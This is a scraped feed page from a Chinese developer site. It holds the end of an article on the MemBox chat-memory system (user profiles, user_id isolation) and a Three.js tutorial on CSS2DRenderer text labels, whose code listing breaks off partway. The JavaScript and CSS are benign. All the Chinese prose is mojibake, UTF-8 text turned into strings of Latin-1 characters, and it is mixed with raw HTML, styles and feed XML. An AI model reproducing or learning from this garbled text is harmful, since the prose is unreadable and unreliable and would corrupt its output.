<p>LLM ä¸ä»…è¯†åˆ«å‡ºäº†çŒ«çš„å“ç§ï¼ˆè‹±çŸ­è“çŒ«ï¼‰ï¼Œè¿˜å°†è¿™äº›ä¿¡æ¯ä¸ç”¨æˆ·å…³è”å­˜å‚¨ã€‚ä¹‹åå†é—®èµ·æ—¶ï¼ŒMemBox èƒ½å‡†ç¡®å›å¿†ï¼š</p>
<blockquote>
<p>ğŸ‘¤ Sevenï¼šæˆ‘çš„å® ç‰©å«ä»€ä¹ˆåå­—ï¼Ÿ</p>
<p>ğŸ¤– MemBoxï¼šä½ çš„å® ç‰©å«å°è“ï¼Œæ˜¯ä¸€åªç°ç™½ç›¸é—´çš„çŒ«å’ªï¼Œç‰¹åˆ«å–œæ¬¢è¶´åœ¨æŸ”è½¯çš„æ¯¯å­ä¸Šä¼‘æ¯ã€‚</p>
</blockquote>
<h3 data-id="heading-28">9.4 ç”¨æˆ·ç”»åƒ</h3>
<p>PowerMem æœ€å¼ºå¤§çš„åŠŸèƒ½ä¹‹ä¸€æ˜¯<strong>è‡ªåŠ¨æ„å»ºç”¨æˆ·ç”»åƒ</strong>ã€‚æ¯æ¬¡å¯¹è¯åï¼Œç³»ç»Ÿä¼šï¼š</p>
<ol>
<li>è·å–è¯¥ç”¨æˆ·ç°æœ‰çš„ç”»åƒï¼ˆå¦‚æœæœ‰ï¼‰ã€‚</li>
<li>åˆ†ææ–°å¯¹è¯ï¼Œæå–æ–°çš„ç”¨æˆ·ä¿¡æ¯ã€‚</li>
<li>è°ƒç”¨ LLM å°†æ–°æ—§ä¿¡æ¯æ™ºèƒ½åˆå¹¶ã€‚</li>
<li>æ›´æ–°ç”¨æˆ·ç”»åƒã€‚</li>
</ol>
<p>éšç€å¯¹è¯ç§¯ç´¯ï¼Œç”»åƒè¶Šæ¥è¶Šä¸°å¯Œï¼š</p>
<pre><code class="hljs language-diff" lang="diff">ğŸ‘¤ ç”¨æˆ·ç”»åƒï¼š
<span class="hljs-deletion">- å§“åï¼šSeven</span>
<span class="hljs-deletion">- å·¥ä½œåœ°ç‚¹ï¼šä¸Šæµ·</span>
<span class="hljs-deletion">- çˆ±å¥½ï¼šè¸¢è¶³çƒ</span>
<span class="hljs-deletion">- å® ç‰©ï¼šè‹±çŸ­è“çŒ«ï¼Œåå«å°è“</span>
</code></pre>
<p>PowerMem æœç´¢è¿”å›çš„ç»“æœä¸­ä¼šåŒ…å« <code>profile_content</code> å­—æ®µï¼Œå°†å…¶æ³¨å…¥åˆ° LLM çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œè®© AI åœ¨å›ç­”æ—¶"è®¤è¯†"è¿™ä¸ªç”¨æˆ·ã€‚</p>
<h3 data-id="heading-29">9.5 ç”¨æˆ·éš”ç¦»</h3>
<p>åœ¨å¤šç”¨æˆ·åœºæ™¯ä¸‹ï¼Œ<strong>æ•°æ®å®‰å…¨å’Œéšç§éš”ç¦»è‡³å…³é‡è¦</strong>ã€‚MemBox é€šè¿‡ <code>user_id</code> å®ç°ä¸¥æ ¼çš„ç”¨æˆ·éš”ç¦»â€”â€”æ¯ä¸ªç”¨æˆ·åªèƒ½è®¿é—®è‡ªå·±çš„è®°å¿†ï¼Œæ— æ³•çœ‹åˆ°å…¶ä»–ç”¨æˆ·çš„æ•°æ®ã€‚</p>
<p><strong>ç”¨æˆ· Aï¼ˆSevenï¼‰çš„å¯¹è¯ï¼š</strong></p>
<blockquote>
<p>ğŸ‘¤ Sevenï¼šæˆ‘æœ€å–œæ¬¢çš„ç¼–ç¨‹è¯­è¨€æ˜¯ Python</p>
<p>ğŸ¤– MemBoxï¼šæ”¶åˆ°ï¼æˆ‘å·²ç»è®°ä¸‹æ¥äº†ï¼šä½ æœ€å–œæ¬¢çš„ç¼–ç¨‹è¯­è¨€æ˜¯ Pythonã€‚</p>
</blockquote>
<p><strong>ç”¨æˆ· Bï¼ˆJaneï¼‰çš„å¯¹è¯ï¼š</strong></p>
<blockquote>
<p>ğŸ‘¤ Janeï¼šæˆ‘æœ€å–œæ¬¢çš„ç¼–ç¨‹è¯­è¨€æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>ğŸ¤– MemBoxï¼šä½ è¿˜æ²¡æœ‰å‘Šè¯‰æˆ‘ä½ æœ€å–œæ¬¢çš„ç¼–ç¨‹è¯­è¨€æ˜¯ä»€ä¹ˆå‘¢ï¼è¦ä¸è¦ç°åœ¨å‘Šè¯‰æˆ‘ï¼Œè®©æˆ‘å¸®ä½ è®°ä¸‹æ¥ï¼Ÿ</p>
</blockquote>
<p>å¯ä»¥çœ‹åˆ°ï¼ŒSeven çš„åå¥½ä¸ä¼šæ³„éœ²ç»™ Janeã€‚è¿™æ˜¯é€šè¿‡ <code>user_id</code> åœ¨å­˜å‚¨å’Œæ£€ç´¢æ—¶çš„è¿‡æ»¤å®ç°çš„ï¼š SeekDB åœ¨åº•å±‚ä¼šå°† <code>user_id</code> ä½œä¸ºè¿‡æ»¤æ¡ä»¶ï¼Œç¡®ä¿æŸ¥è¯¢ç»“æœåªåŒ…å«å½“å‰ç”¨æˆ·çš„æ•°æ®ã€‚</p>
<h2 data-id="heading-30">10. æ€»ç»“</h2>
<p>æœ¬æ–‡ä»‹ç»äº†å¦‚ä½•ä½¿ç”¨ SeekDB å’Œ PowerMem æ„å»ºä¸€ä¸ªå¤šæ¨¡æ€æ™ºèƒ½è®°å¿†ç³»ç»Ÿ MemBoxã€‚é€šè¿‡ SeekDB çš„å‘é‡æ£€ç´¢èƒ½åŠ›å’Œ PowerMem çš„æ™ºèƒ½è®°å¿†æå–ï¼ŒMemBox èƒ½å¤Ÿè‡ªåŠ¨ä»å¯¹è¯ä¸­æå–å…³é”®ä¿¡æ¯ã€æ„å»ºç”¨æˆ·ç”»åƒï¼Œå¹¶åœ¨åç»­å¯¹è¯ä¸­æä¾›ä¸ªæ€§åŒ–å›å¤ã€‚å‰ç«¯åŸºäº Vercel AI SDK å®ç°äº†æµå¼å¯¹è¯å’Œå¤šæ¨¡æ€å›¾ç‰‡ç†è§£ï¼Œåç«¯é€šè¿‡ FastAPI æä¾›è®°å¿†å­˜å‚¨å’Œæ£€ç´¢æœåŠ¡ã€‚æ•´ä¸ªç³»ç»Ÿè¿˜æ”¯æŒå¤šç”¨æˆ·éš”ç¦»ï¼Œç¡®ä¿æ¯ä¸ªç”¨æˆ·çš„æ•°æ®å®‰å…¨ç‹¬ç«‹ã€‚</p>
<h2 data-id="heading-31">11. å‚è€ƒèµ„æ–™</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foceanbase%2Fseekdb" target="_blank" title="https://github.com/oceanbase/seekdb" ref="nofollow noopener noreferrer">SeekDB æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foceanbase%2Fpowermem" target="_blank" title="https://github.com/oceanbase/powermem" ref="nofollow noopener noreferrer">PowerMem æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fai-sdk.dev" target="_blank" title="https://ai-sdk.dev" ref="nofollow noopener noreferrer">Vercel AI SDK</a></li>
</ul>
<h2 data-id="heading-32">12 æ¬¢è¿å…³æ³¨</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78dd2973863040e5b0eb2a4abcc59ec5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2U3ZW4yNTg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523361&amp;x-signature=YJdIUwJPjY5Fsixz%2F8TQpphiKkQ%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Three.js å®æˆ˜ï¼šä½¿ç”¨ DOM/CSS æ‰“é€ é«˜æ€§èƒ½ 3D æ–‡å­—]]></title>    <link>https://juejin.cn/post/7597326073671516175</link>    <guid>https://juejin.cn/post/7597326073671516175</guid>    <pubDate>2026-01-20T14:21:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597326073671516175" data-draft-id="7596186565270437903" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Three.js å®æˆ˜ï¼šä½¿ç”¨ DOM/CSS æ‰“é€ é«˜æ€§èƒ½ 3D æ–‡å­—"/> <meta itemprop="keywords" content="å‰ç«¯,WebGL,three.js"/> <meta itemprop="datePublished" content="2026-01-20T14:21:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çƒ›é˜´"/> <meta itemprop="url" content="https://juejin.cn/user/950397795841032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Three.js å®æˆ˜ï¼šä½¿ç”¨ DOM/CSS æ‰“é€ é«˜æ€§èƒ½ 3D æ–‡å­—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/950397795841032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çƒ›é˜´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:21:25.000Z" title="Tue Jan 20 2026 14:21:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Three.js å®æˆ˜ï¼šä½¿ç”¨ DOM/CSS æ‰“é€ é«˜æ€§èƒ½ 3D æ–‡å­—</h2>
<p>åœ¨ Three.js ä¸­æ¸²æŸ“æ–‡å­—æœ‰å¤šç§æ–¹æ¡ˆï¼Œæœ¬æ–‡ä»‹ç»ä¸€ç§é«˜æ€§èƒ½ä¸”çµæ´»çš„æ–¹æ¡ˆï¼š<strong>CSS2DRenderer</strong>ã€‚å®ƒèƒ½å°† DOM å…ƒç´ æ— ç¼åµŒå…¥ 3D åœºæ™¯ï¼ŒåŒæ—¶ä¿ç•™ CSS çš„å…¨éƒ¨èƒ½åŠ›ã€‚</p>
<h3 data-id="heading-1">ä¸ºä»€ä¹ˆé€‰æ‹© DOM/CSS æ–¹æ¡ˆï¼Ÿ</h3>




















<table><thead><tr><th>æ–¹æ¡ˆ</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th></tr></thead><tbody><tr><td>TextGeometry</td><td>çœŸæ­£çš„ 3D å‡ ä½•ä½“</td><td>æ€§èƒ½å¼€é”€å¤§ï¼Œéœ€åŠ è½½å­—ä½“æ–‡ä»¶</td></tr><tr><td><strong>CSS2DRenderer</strong></td><td>æ¸…æ™°é”åˆ©ã€CSS å…¨ç‰¹æ€§ã€é«˜æ€§èƒ½</td><td>æ— æ³•è¢« 3D ç‰©ä½“é®æŒ¡</td></tr></tbody></table>
<p>CSS2DRenderer çš„æ ¸å¿ƒä¼˜åŠ¿ï¼š</p>
<ul>
<li><strong>æ–‡å­—æ°¸è¿œæ¸…æ™°</strong>ï¼šæµè§ˆå™¨åŸç”Ÿæ¸²æŸ“ï¼Œä¸å— 3D ç¼©æ”¾å½±å“</li>
<li><strong>CSS å…¨ç‰¹æ€§</strong>ï¼šé˜´å½±ã€æ¸å˜ã€åŠ¨ç”»ã€<code>backdrop-filter</code> ç£¨ç ‚ç»ç’ƒæ•ˆæœ</li>
<li><strong>æ€§èƒ½ä¼˜å¼‚</strong>ï¼šDOM æ¸²æŸ“ä¸ WebGL æ¸²æŸ“åˆ†ç¦»ï¼Œäº’ä¸å¹²æ‰°</li>
</ul>
<h3 data-id="heading-2">æ ¸å¿ƒå®ç°</h3>
<h4 data-id="heading-3">1. åˆå§‹åŒ–åŒæ¸²æŸ“å™¨</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">CSS2DRenderer</span>, <span class="hljs-title class_">CSS2DObject</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'three/examples/jsm/renderers/CSS2DRenderer.js'</span>;

<span class="hljs-comment">// WebGL æ¸²æŸ“å™¨ï¼ˆæ¸²æŸ“ 3D åœºæ™¯ï¼‰</span>
<span class="hljs-keyword">const</span> renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>({ <span class="hljs-attr">antialias</span>: <span class="hljs-literal">true</span> });
renderer.<span class="hljs-title function_">setSize</span>(innerWidth, innerHeight);
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>);

<span class="hljs-comment">// CSS2D æ¸²æŸ“å™¨ï¼ˆæ¸²æŸ“ DOM æ ‡ç­¾ï¼‰</span>
<span class="hljs-keyword">const</span> labelRenderer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CSS2DRenderer</span>();
labelRenderer.<span class="hljs-title function_">setSize</span>(innerWidth, innerHeight);
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(labelRenderer.<span class="hljs-property">domElement</span>.<span class="hljs-property">style</span>, {
  <span class="hljs-attr">position</span>: <span class="hljs-string">'absolute'</span>,
  <span class="hljs-attr">top</span>: <span class="hljs-string">'0'</span>,
  <span class="hljs-attr">pointerEvents</span>: <span class="hljs-string">'none'</span> <span class="hljs-comment">// å…³é”®ï¼šè®©é¼ æ ‡äº‹ä»¶ç©¿é€</span>
});
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(labelRenderer.<span class="hljs-property">domElement</span>);
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š<code>pointerEvents: 'none'</code> è®©é¼ æ ‡äº‹ä»¶ç©¿é€ DOM å±‚ï¼Œå¦åˆ™æ— æ³•æ‹–æ‹½ 3D åœºæ™¯ã€‚</p>
<h4 data-id="heading-4">2. åˆ›å»º CSS2D æ ‡ç­¾</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">createLabel</span> = (<span class="hljs-params">text, position</span>) =&gt; {
  <span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
  div.<span class="hljs-property">className</span> = <span class="hljs-string">'label'</span>;
  div.<span class="hljs-property">textContent</span> = text;
  <span class="hljs-keyword">const</span> label = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CSS2DObject</span>(div);
  label.<span class="hljs-property">position</span>.<span class="hljs-title function_">copy</span>(position);
  <span class="hljs-keyword">return</span> label;
};

<span class="hljs-comment">// å°†æ ‡ç­¾æ·»åŠ åˆ° 3D ç‰©ä½“ä¸Š</span>
earth.<span class="hljs-title function_">add</span>(<span class="hljs-title function_">createLabel</span>(<span class="hljs-string">'Earth'</span>, <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">0</span>)));
</code></pre>
<p>æ ‡ç­¾æ·»åŠ åˆ° <code>earth</code> ç½‘æ ¼åï¼Œä¼šè‡ªåŠ¨è·Ÿéšåœ°çƒçš„æ—‹è½¬å’Œä½ç§»ã€‚</p>
<h4 data-id="heading-5">3. åŒæ¸²æŸ“å™¨åŒæ­¥æ¸²æŸ“</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">animate</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">requestAnimationFrame</span>(animate);
  renderer.<span class="hljs-title function_">render</span>(scene, camera);      <span class="hljs-comment">// æ¸²æŸ“ 3D åœºæ™¯</span>
  labelRenderer.<span class="hljs-title function_">render</span>(scene, camera); <span class="hljs-comment">// æ¸²æŸ“ DOM æ ‡ç­¾</span>
}
</code></pre>
<h4 data-id="heading-6">4. CSS æ ·å¼</h4>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.label</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#FFF</span>;
  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Helvetica Neue'</span>, sans-serif;
  <span class="hljs-attribute">font-weight</span>: bold;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span> <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.6</span>);
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
  backdrop-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">4px</span>); <span class="hljs-comment">/* ç£¨ç ‚ç»ç’ƒæ•ˆæœ */</span>
}
</code></pre>
<p><code>backdrop-filter: blur()</code> å®ç°çš„ç£¨ç ‚ç»ç’ƒæ•ˆæœï¼Œåœ¨çº¯ WebGL ä¸­éœ€è¦å¤æ‚çš„åå¤„ç†æ‰èƒ½å®ç°ï¼Œè€Œ CSS ä¸€è¡Œä»£ç æå®šã€‚</p>
<h3 data-id="heading-7">å®Œæ•´ä»£ç </h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">THREE</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'three'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">OrbitControls</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'three/examples/jsm/controls/OrbitControls.js'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">CSS2DRenderer</span>, <span class="hljs-title class_">CSS2DObject</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'three/examples/jsm/renderers/CSS2DRenderer.js'</span>;

<span class="hljs-comment">// åœºæ™¯ã€ç›¸æœº</span>
<span class="hljs-keyword">const</span> scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>();
<span class="hljs-keyword">const</span> camera = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PerspectiveCamera</span>(<span class="hljs-number">75</span>, innerWidth / innerHeight, <span class="hljs-number">0.1</span>, <span class="hljs-number">1000</span>);
camera.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> = <span class="hljs-number">5</span>;

<span class="hljs-comment">// WebGL æ¸²æŸ“å™¨</span>
<span class="hljs-keyword">const</span> renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>({ <span class="hljs-attr">antialias</span>: <span class="hljs-literal">true</span> });
renderer.<span class="hljs-title function_">setSize</span>(innerWidth, innerHeight);
renderer.<span class="hljs-title function_">setPixelRatio</span>(devicePixelRatio);
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>);

<span class="hljs-comment">// CSS2D æ¸²æŸ“å™¨</span>
<span class="hljs-keyword">const</span> labelRenderer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CSS2DRenderer</span>();
labelRenderer.<span class="hljs-title function_">setSize</span>(innerWidth, innerHeight);
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(labelRenderer.<span class="hljs-property">domElement</span>.<span class="hljs-property">style</span>, {
  <span class="hljs-attr">position</span>: <span class="hljs-string">'absolute'</span>,
  <span class="hljs-attr">top</span>: <span class="hljs-string">'0'</span>,
  <span class="hljs-attr">pointerEvents</span>: <span class="hljs-string">'none'</span>
});
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(labelRenderer.<span class="hljs-property">domElement</span>);

<span class="hljs-comment">// è½¨é“æ§åˆ¶å™¨</span>
<span class="hljs-keyword">const</span> controls = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrbitControls</span>(camera, renderer.<span class="hljs-property">domElement</span>);
controls.<span class="hljs-property">enableDamping</span> = <span class="hljs-literal">true</span>;

<span class="hljs-comment">// åˆ›å»ºåœ°çƒ</span>
<span class="hljs-keyword">const</span> earth = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">SphereGeometry</span>(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>),
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshStandardMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x2233ff</span>, <span class="hljs-attr">roughness</span>: <span class="hljs-number">0.5</span> })
);
scene.<span class="hljs-title function_">add</span>(earth);

<span class="hljs-comment">// ç”Ÿæˆåœ°çƒçº¹ç†</span>
<span class="hljs-keyword">const</span> canvas = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'canvas'</span>), { <span class="hljs-attr">width</span>: <span class="hljs-number">512</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">512</span> });
<span class="hljs-keyword">const</span> ctx = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);
ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">'#1e90ff'</span>;
ctx.<span class="hljs-title function_">fillRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">512</span>, <span class="hljs-number">512</span>);
ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">'#228b22'</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) {
  ctx.<span class="hljs-title function_">beginPath</span>();
  ctx.<span class="hljs-title function_">arc</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">512</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">512</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">50</span> + <span class="hljs-number">20</span>, <span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> * <span class="hljs-number">2</span>);
  ctx.<span class="hljs-title function_">fill</span>();
}
earth.<span class="hljs-property">material</span>.<span class="hljs-property">map</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CanvasTexture</span>(canvas);

<span class="hljs-comment">// åˆ›å»ºæ ‡ç­¾å·¥å‚å‡½æ•°</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">createLabel</span> = (<span class="hljs-params">text, position</span>) =&gt; {
  <span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
  div.<span class="hljs-property">className</span> = <span class="hljs-string">'label'</span>;
  div.<span class="hljs-property">textContent</span> = text;
  <span class="hljs-keyword">const</span> label = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CSS2DObject</span>(div);
  label.<span class="hljs-property">position</span>.<span class="hljs-title function_">copy</span>(position);
  <span class="hljs-keyword">return</span> label;
};

